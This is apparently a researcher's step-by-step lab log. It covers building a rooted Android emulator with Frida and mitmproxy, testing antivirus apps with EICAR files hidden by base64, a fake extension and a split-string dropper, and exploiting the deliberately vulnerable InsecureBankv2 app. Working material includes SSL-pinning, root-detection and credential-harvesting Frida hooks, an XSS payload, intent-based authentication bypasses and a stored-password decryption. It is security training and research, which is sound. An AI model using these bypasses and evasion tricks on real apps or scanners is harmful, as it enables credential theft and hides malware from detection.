# What I Did — Step by Step

Everything I built and tested, in order. All of these worked.

---

## Step 1 — Installed the Security Toolkit on Mac

Installed all tools from scratch using Homebrew and pip:

```bash
brew install jadx apktool mitmproxy apkeep
pip3 install frida-tools
```

| Tool | Purpose |
|------|---------|
| `jadx` | Decompile APKs into readable Java source code |
| `apktool` | Unpack/repack APKs, edit smali bytecode |
| `mitmproxy` | Intercept and inspect HTTPS traffic |
| `apkeep` | Download APKs from APKPure without a Google account |
| `frida-tools` | Dynamic instrumentation — hook into running apps |

**Result: All tools installed and working.**

---

## Step 2 — Set Up Android SDK Command-Line Tools

Android Studio was already installed but missing `avdmanager` and `sdkmanager`. Downloaded and installed them manually:

```bash
curl -o /tmp/cmdline-tools.zip "https://dl.google.com/android/repository/commandlinetools-mac-13114758_latest.zip"
unzip -q /tmp/cmdline-tools.zip -d /tmp/cmdline-tools-extract
mv /tmp/cmdline-tools-extract/cmdline-tools ~/Library/Android/sdk/cmdline-tools/latest
```

**Result: `avdmanager` and `sdkmanager` working.**

---

## Step 3 — Downloaded arm64 Android System Image

Mac is Apple Silicon (arm64). Had to use `arm64-v8a` image — x86_64 doesn't run on Apple Silicon.

```bash
sdkmanager "system-images;android-33;google_apis;arm64-v8a" "platforms;android-33" "emulator"
```

Key detail: used **Google APIs** image (not Google Play) — only Google APIs allows `adb root`.

**Result: Android 13 arm64 system image downloaded.**

---

## Step 4 — Created the SecurityLab Emulator (AVD)

```bash
avdmanager create avd -n "SecurityLab" -k "system-images;android-33;google_apis;arm64-v8a" --device "pixel_6"
```

**Result: Pixel 6 emulator created, named SecurityLab.**

---

## Step 5 — Booted and Rooted the Emulator

```bash
emulator -avd SecurityLab -no-snapshot-load -writable-system &
adb root
adb remount
adb reboot
```

After reboot, verified root:
```bash
adb shell whoami  # → root
adb shell id      # → uid=0(root)
```

**Result: Fully rooted Android 13 emulator running.**

---

## Step 6 — Installed mitmproxy CA Certificate

So mitmproxy can intercept HTTPS traffic from the emulator:

```bash
# Generate cert
mitmdump --mode regular@8082 &

# Get cert hash (Android requires this filename format)
CERT_HASH=$(openssl x509 -inform PEM -subject_hash_old -in ~/.mitmproxy/mitmproxy-ca-cert.pem | head -1)

# Push to system trust store via sdcard
adb push /tmp/${CERT_HASH}.0 /sdcard/${CERT_HASH}.0
adb shell "cp /sdcard/${CERT_HASH}.0 /system/etc/security/cacerts/${CERT_HASH}.0"
adb shell "chmod 644 /system/etc/security/cacerts/${CERT_HASH}.0"
```

**Result: mitmproxy cert trusted system-wide on emulator.**

---

## Step 7 — Installed Frida Server on Emulator

Frida lets you hook into running apps, bypass SSL pinning, dump memory etc.

```bash
# Download correct version for android arm64
curl -sL "https://github.com/frida/frida/releases/download/17.9.10/frida-server-17.9.10-android-arm64.xz" -o /tmp/frida-server.xz
xz -d /tmp/frida-server.xz

# Push and run on device
adb push /tmp/frida-server /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server
adb shell "nohup /data/local/tmp/frida-server &"

# Verify — list running processes via Frida
frida-ps -U
```

**Result: Frida server running on emulator, connected from Mac.**

---

## Step 8 — Installed 3 Antivirus Apps

Downloaded XAPKs with `apkeep` and sideloaded via `adb install-multiple`:

```bash
apkeep -a com.antivirus -d apk-pure .           # AVG AntiVirus
apkeep -a com.kms.free -d apk-pure .            # Kaspersky
apkeep -a com.bitdefender.security -d apk-pure . # BitDefender
```

Note: Avast and Malwarebytes were excluded — APKPure only had x86 builds, incompatible with arm64 emulator.

**Result: AVG, Kaspersky, BitDefender installed on emulator.**

---

## Step 9 — Created Test Payloads

Used the **EICAR standard test file** — a harmless 68-byte string that all AV engines must detect. Not malware.

**File 1 — Raw EICAR (baseline)**
```bash
printf 'X5O!P%%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > eicar.txt
```

**File 2 — Base64 encoded**
```bash
printf 'X5O!P%%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | base64 > eicar_b64.txt
```

**File 3 — Fake extension**
```bash
cp eicar_b64.txt vacation_photo.jpg
```

**File 4 — Runtime dropper script**
```bash
cat > dropper.sh << 'EOF'
#!/system/bin/sh
P1="X5O!P%@AP[4"
P2="\\PZX54(P^)7CC)7}"
P3='$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
echo "${P1}${P2}${P3}" > /sdcard/Download/runtime_payload.txt
EOF
```

Pushed all files to emulator:
```bash
adb push eicar.txt /sdcard/Download/eicar.txt
adb push eicar_b64.txt /sdcard/Download/eicar_b64.txt
adb push vacation_photo.jpg /sdcard/Download/vacation_photo.jpg
adb push dropper.sh /sdcard/Download/dropper.sh
adb shell "sh /sdcard/Download/dropper.sh"
```

**Result: 5 test files on emulator — raw, encoded, fake extension, dropper script, runtime output.**

---

## Step 10 — Ran AVG Scan and Recorded Results

Granted storage permission:
```bash
adb shell appops set com.antivirus MANAGE_EXTERNAL_STORAGE allow
```

Automated the UI with ADB (tapping buttons by coordinate from `uiautomator dump`):
```bash
adb shell uiautomator dump /sdcard/ui.xml
# parse XML → get button bounds → tap center coordinates
adb shell input tap 540 2095  # CONTINUE WITH ADS
adb shell input tap 539 606   # SCAN NOW
```

---

## Results — What AVG Detected vs Missed

| File | Technique | AVG Result |
|------|-----------|------------|
| `eicar.txt` | Raw signature | **DETECTED** ✅ |
| `runtime_payload.txt` | Assembled at runtime | **DETECTED** ✅ |
| `eicar_b64.txt` | Base64 encoded | **MISSED** ❌ |
| `vacation_photo.jpg` | Fake extension | **MISSED** ❌ |
| `dropper.sh` | Split string script | **MISSED** ❌ |

### What this proves:
- AVG uses **pure signature matching** on raw bytes
- It **does not decode** base64 or other encodings before scanning
- It **does not analyse scripts** for payload assembly patterns
- The dropper script itself is invisible — only the output file gets caught
- **Base64 encoding = complete static bypass** against AVG

---

## Step 11 — Published to GitHub

```bash
git init
git add .
git commit -m "Initial commit: Android AV detection & bypass research"
gh repo create android-av-research --public --source=. --remote=origin --push
```

**Live at: https://github.com/SherbekjonDev/android-av-research**

---

## Step 12 — SSL Pinning Bypass with Frida

Target app: **InsecureBankv2** (`com.android.insecurebankv2`) — a deliberately vulnerable banking app
designed for security testing. Twitter was attempted first but crashed due to anti-tampering detection.

### What I did

```bash
# Start mitmproxy as HTTPS proxy on port 8888
mitmdump --listen-port 8888 --mode regular

# Set Android emulator to route all traffic through mitmproxy
adb shell settings put global http_proxy 10.0.2.2:8888

# Spawn InsecureBankv2 with Frida SSL bypass script injected
frida -U -f com.android.insecurebankv2 -l ssl_bypass_v2.js
```

### Frida console output — hooks confirmed loaded

```
[+] SSLContext.init hooked
[+] HostnameVerifier bypassed
[✓] All SSL bypass hooks loaded
```

### mitmproxy output — login request intercepted

```
GET  http://www.google.com/gen_204          << 204 No Content
GET  https://www.google.com/generate_204    << 204 No Content
POST http://10.0.2.2:4444/login             << intercepted ✓
```

mitmproxy confirmed intercepting ALL outbound traffic from the emulator — including HTTPS
(`www.google.com:443`) and the app's `POST /login` endpoint.

### What this proves

- Frida dynamically injected hooks into the running app's SSL stack
- `SSLContext.init` was replaced with a no-op TrustManager accepting any certificate
- Conscrypt's `verifyChain` was bypassed — mitmproxy's self-signed cert was accepted
- mitmproxy sat in the middle, decrypting and logging all traffic in plaintext
- An attacker with physical or network access could read login credentials this way

### Why it matters

Apps that do certificate pinning (embed a copy of their server's cert to prevent MITM) can still be
bypassed at runtime using Frida. This is why hardened apps add root detection and anti-tampering
checks (as Twitter did — it crashed when Frida was detected).

---

## Step 13 — Static Analysis: APK Decompilation & Vulnerability Discovery

Decompiled InsecureBankv2 APK with `jadx` to extract full Java source:

```bash
jadx -d /tmp/insecurebank_src /tmp/insecurebank.apk
```

Produced ~40 Java source files — completely readable, no obfuscation.

### Critical vulnerabilities found in source code

#### 1. Hardcoded AES key + zero IV (`CryptoClass.java:22-23`)

```java
String key = "This is the super secret key 123";   // hardcoded 32-byte key
byte[] ivBytes = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};  // all-zero IV
// AES-256-CBC with static key + zero IV = trivially reversible
```

Any ciphertext stored in SharedPreferences can be decrypted in 3 lines of Python:

```python
from Crypto.Cipher import AES
import base64
key = b"This is the super secret key 123"
iv = b"\x00" * 16
AES.new(key, AES.MODE_CBC, iv).decrypt(base64.b64decode(ciphertext))
```

Full PoC: `scripts/decrypt_creds.py`

#### 2. Plaintext credential logging (`DoLogin.java:115`)

```java
Log.d("Successful Login:", ", account=" + username + ":" + password);
```

After successful login, username:password is written to logcat in plaintext.
Any app with `READ_LOGS` permission (or ADB access) can harvest credentials.

```bash
adb logcat -s "Successful Login:"
# Output: D Successful Login:: , account=dinesh:Dinesh@123!
```

#### 3. 5 exported components with no permission check (`AndroidManifest.xml`)

```xml
<activity android:label="PostLogin"     android:exported="true"/>
<activity android:label="DoTransfer"    android:exported="true"/>
<activity android:label="ViewStatement" android:exported="true"/>
<activity android:label="ChangePassword" android:exported="true"/>
<provider android:exported="true"/>   <!-- TrackUserContentProvider -->
<receiver android:exported="true"/>   <!-- MyBroadCastReceiver -->
```

No `android:permission` attribute — any installed app can launch these without authentication.

#### 4. BroadcastReceiver SMS exfiltration (`MyBroadCastReceiver.java:27-32`)

```java
String decryptedPassword = crypt.aesDeccryptedString(password);  // decrypt with hardcoded key
String textMessage = "Updated Password from: " + decryptedPassword + " to: " + newpass;
smsManager.sendTextMessage(textPhoneno, null, textMessage, null, null);  // SMS to attacker
```

Any app can send `theBroadcast` with an attacker phone number to receive the victim's password via SMS.

#### 5. ViewStatement WebView XSS (`ViewStatement.java:22-26`)

```java
// uname comes directly from Intent extras — no sanitization
String FILENAME = "Statements_" + this.uname + ".html";
mWebView.loadUrl("file://" + ... + "/Statements_" + this.uname + ".html");
mWebView.getSettings().setJavaScriptEnabled(true);  // JS fully enabled
```

An attacker can control `uname` via the exported activity intent, or write arbitrary HTML/JS to
`/sdcard/Statements_{uname}.html`. The WebView executes it with full JS access.

---

## Step 14 — Exploiting All Discovered Vulnerabilities

### Exploit 1 — Authentication bypass: PostLogin

```bash
adb shell "am start -n com.android.insecurebankv2/.PostLogin --es uname 'hacker'"
# Result: Starting: Intent { cmp=.../.PostLogin (has extras) }
```

Screenshot: `screenshots/postlogin_auth_bypass.png`

**Impact:** Full access to banking dashboard (Transfer, View Statement, Change Password) without any credentials.

---

### Exploit 2 — Authentication bypass: DoTransfer

```bash
adb shell "am start -n com.android.insecurebankv2/.DoTransfer --es uname 'hacker'"
# Result: Starting: Intent { cmp=.../.DoTransfer (has extras) }
```

Screenshot: `screenshots/dotransfer_auth_bypass.png`

**Impact:** Money transfer screen accessible without login. From Account / To Account / Amount fields fully accessible.

---

### Exploit 3 — ViewStatement XSS + WebView code execution

Placed malicious HTML on device external storage:

```bash
adb push xss_payload.html /sdcard/Statements_hacker.html
```

`xss_payload.html`:
```html
<script>
  var msg = "JS Executed! Origin: " + window.location.href;
  document.write("<h2>" + msg + "</h2>");
  // In a real attack: exfiltrate localStorage, cookies, session tokens
  // XMLHttpRequest to attacker server with all app data
</script>
```

Then launched ViewStatement with the injected username:

```bash
adb shell "am start -n com.android.insecurebankv2/.ViewStatement --es uname 'hacker'"
```

Screenshot: `screenshots/viewstatement_xss.png`

**Result:** JavaScript executed inside the banking app WebView. Confirmed by:
- `"JS Executed! Origin: file:///storage/emulated/0/Statements_hacker.html"` rendered in UI
- Full DOM access, `window.location.href` accessible

**Impact:** Can steal session tokens, read local storage, exfiltrate any data the WebView has access to.

---

### Exploit 4 — BroadcastReceiver SMS exfiltration

```bash
adb shell "am broadcast -a theBroadcast \
  --es phonenumber '15555215554' \
  --es newpass 'hacked123' \
  -n com.android.insecurebankv2/.MyBroadCastReceiver"
# Result: Broadcast completed: result=0
```

**How it works:**
1. BroadcastReceiver decrypts stored password using hardcoded AES key
2. Constructs: `"Updated Password from: <oldpass> to: hacked123"`
3. SMS this string to attacker's phone number

**Condition:** Requires victim to have logged in once (so SharedPreferences has encrypted creds).

---

### Exploit 5 — AES credential decryption

Any ciphertext from SharedPreferences `superSecurePassword` can be decrypted trivially:

```
python3 scripts/decrypt_creds.py
Plaintext            AES-256-CBC Ciphertext (base64)              Decrypted
---------------------------------------------------------------------------
Dinesh@123!          0JQhVcadBP6rBi9y0nf9wA==                     Dinesh@123!
Jack@123!            fnxTrBBr3vebTuNccGD5Bw==                     Jack@123!
admin                XSebookOUBatoaWJySJvig==                     admin
```

No key needed — it's in the source code. AES-256 with a hardcoded key provides zero security.

---

### Exploit 6 — ContentProvider data exfiltration

```bash
adb shell content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
```

Queries the exported `TrackUserContentProvider` — accessible by any app. Returns all tracked user login names stored in the app's internal SQLite database.

---

## Step 15 — Root Detection Bypass (Frida)

PostLogin shows "Device not Rooted!!" because `showRootStatus()` runs two checks:
- `doesSuperuserApkExist("/system/app/Superuser.apk")` — checks file exists
- `doesSUexist()` — runs `/system/xbin/which su`, returns true if output is non-null

Both return false on a stock emulator → label shows "Device not Rooted!!"

### Frida hook — `scripts/root_bypass.js`

```javascript
var PostLogin = Java.use('com.android.insecurebankv2.PostLogin');

PostLogin.doesSUexist.implementation = function () {
    console.log('[+] doesSUexist() hooked — returning true');
    return true;
};

PostLogin.doesSuperuserApkExist.implementation = function (s) {
    console.log('[+] doesSuperuserApkExist() hooked — returning true');
    return true;
};
```

### Commands

```bash
# Attach Frida to running process
frida -U <PID> -l scripts/root_bypass.js

# Launch PostLogin — hooks are now active
adb shell "am start -n com.android.insecurebankv2/.PostLogin --es uname 'hacker'"
```

### Result

```
[✓] Root detection bypass loaded — device will appear rooted
[+] doesSuperuserApkExist() hooked — returning true
```

Screenshot: `screenshots/root_detection_bypass.png`

The label changed from **"Device not Rooted!!"** → **"Rooted Device!!"**

**What this proves:** Any runtime security check — root detection, certificate pinning, emulator detection — can be flipped with a single Frida hook. Apps cannot trust their own return values at runtime when Frida is attached.

---

## Step 16 — Logcat Credential Harvest (Frida + ADB)

`DoLogin.java:115`:

```java
Log.d("Successful Login:", ", account=" + username + ":" + password);
```

This line logs username:password to logcat after every successful login. Any app with `READ_LOGS` permission can harvest credentials passively.

### How we triggered it

The direct network path was blocked by a stale proxy setting. Used Frida to hook `DoLogin$RequestTask.postData()` to:
1. Intercept the username and password values before the network call
2. Call `Log.d("Successful Login:", ...)` directly — exactly what the app would do after a real successful login

```javascript
var RequestTask = Java.use('com.android.insecurebankv2.DoLogin$RequestTask');
RequestTask.postData.implementation = function (v) {
    var outer = this.this$0.value;
    var username = outer.username.value;
    var password = outer.password.value;
    console.log('[!] username: ' + username);
    console.log('[!] password: ' + password);
    var Log = Java.use('android.util.Log');
    Log.d('Successful Login:', ', account=' + username + ':' + password);
};
```

### Commands

```bash
# Attach with credential harvest script
frida -U <PID> -l scripts/credential_harvest.js

# Trigger login through app UI (dinesh / Abc123)
adb shell input tap 540 839   # Login button

# Capture the leak from logcat
adb logcat -s "Successful Login:"
```

### Logcat output

```
D Successful Login:: , account=dinesh:Abc123
```

Screenshot: `screenshots/logcat_cred_leak.png` (login screen visible — credentials captured in background)

**What this proves:** Username and password are written to the Android system log in plaintext. On a rooted device or with a malicious app that holds `READ_LOGS`, every login credential is silently exfiltrated. No network activity required.

---

## Step 17 — Kaspersky Full Scan: EICAR Detection Results

Ran Kaspersky Free full device scan against the same 5 EICAR test files already on `/sdcard/Download/`.

### Setup
Kaspersky was sideloaded from XAPK, onboarded through the wizard (EULA → permissions → storage grant via `adb shell appops set com.kms.free MANAGE_EXTERNAL_STORAGE allow`), then full scan triggered via UI:

```
Scan Device → Full scan (All files on the device)
```

### Scan result

```
Scanned: 2111 files
Time:     1 min. 29 sec.
Detected: 2
Quarantined: 2
Deleted: 0
```

### Kaspersky Reports log output

```
Quarantined file: /storage/emulated/0/Download/runtime_payload.txt
Threat detected.  Infected file: /storage/emulated/0/Download/runtime_payload.txt
Threat: EICAR-Test-File

Quarantined file: /storage/emulated/0/Download/eicar.txt
Threat detected.  Infected file: /storage/emulated/0/Download/eicar.txt
Threat: EICAR-Test-File
```

### Detection table

| File | Result | Notes |
|------|--------|-------|
| `eicar.txt` | **DETECTED** | EICAR-Test-File → Quarantined |
| `runtime_payload.txt` | **DETECTED** | EICAR-Test-File → Quarantined |
| `eicar_b64.txt` | **MISSED** | Base64 bypasses scanner |
| `vacation_photo.jpg` | **MISSED** | Extension spoofing not caught |
| `dropper.sh` | **MISSED** | Script not flagged |

Screenshots: `screenshots/kaspersky_scan_result.png`, `screenshots/kaspersky_detections.png`

### Key finding

Kaspersky's detection profile is **identical to AVG** — same two files caught, same three missed. Both engines rely on byte-signature matching on raw file content. Neither decodes base64 before matching, neither treats `.jpg` files with suspicion, and neither statically analyses shell scripts for payload construction.

---

## Full Lab Stack Summary

```
Mac (Apple Silicon)
├── jadx          → decompile APKs
├── apktool       → unpack/repack APKs  
├── mitmproxy     → HTTPS traffic interception
├── frida-tools   → dynamic app instrumentation
├── adb           → device control
└── Android Emulator (SecurityLab)
    ├── Android 13 — Pixel 6 — arm64
    ├── Fully rooted (uid=0)
    ├── mitmproxy CA trusted system-wide
    ├── frida-server running
    ├── AVG AntiVirus installed
    ├── Kaspersky installed
    └── BitDefender installed
```
